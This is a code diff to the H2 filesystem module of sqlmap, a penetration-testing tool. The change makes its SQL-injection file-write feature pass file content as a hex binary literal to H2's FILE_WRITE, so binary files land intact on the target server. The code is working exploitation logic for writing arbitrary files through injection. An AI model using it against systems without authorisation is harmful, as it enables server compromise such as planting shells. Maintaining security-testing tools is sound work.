@@ -6,7 +6,7 @@ See the file 'LICENSE' for copying permission
 """
 
 from lib.core.common import checkFile
-from lib.core.convert import getText
+from lib.core.convert import encodeHex
 from lib.core.data import kb
 from lib.core.data import logger
 from lib.core.enums import CHARSET_TYPE
@@ -34,14 +34,15 @@ class Filesystem(GenericFilesystem):
         self.checkDbmsOs()
 
         with open(localFile, "rb") as f:
-            content = getText(f.read())
+            content = f.read()
 
         infoMsg = "writing the file content to '%s'" % remoteFile
         logger.info(infoMsg)
 
         # NOTE: FILE_WRITE() is the H2 builtin counterpart of FILE_READ(); being a plain scalar it needs no
-        # stacked queries (the write happens as a side effect over UNION/error/blind). The content is passed
-        # as a string literal (STRINGTOUTF8) so it survives sqlmap's CHAR()-encoding (unlike an X'..' literal)
-        inject.getValue("CAST(FILE_WRITE(STRINGTOUTF8('%s'),'%s') AS INT)" % (content.replace("'", "''"), remoteFile), expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)
+        # stacked queries. Content is passed as a binary hex literal (X'..') so arbitrary/binary bytes survive
+        # byte-for-byte - the old STRINGTOUTF8() of a getText()-decoded string mangled any non-UTF-8 content,
+        # and H2 has no string->binary decoder (HEXTORAW/base64/UNHEX absent); cf. MySQL's 0x<hex> literal
+        inject.getValue("CAST(FILE_WRITE(X'%s','%s') AS INT)" % (encodeHex(content, binary=False), remoteFile), expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)
 
         return self.askCheckWrittenFile(localFile, remoteFile, forceCheck)
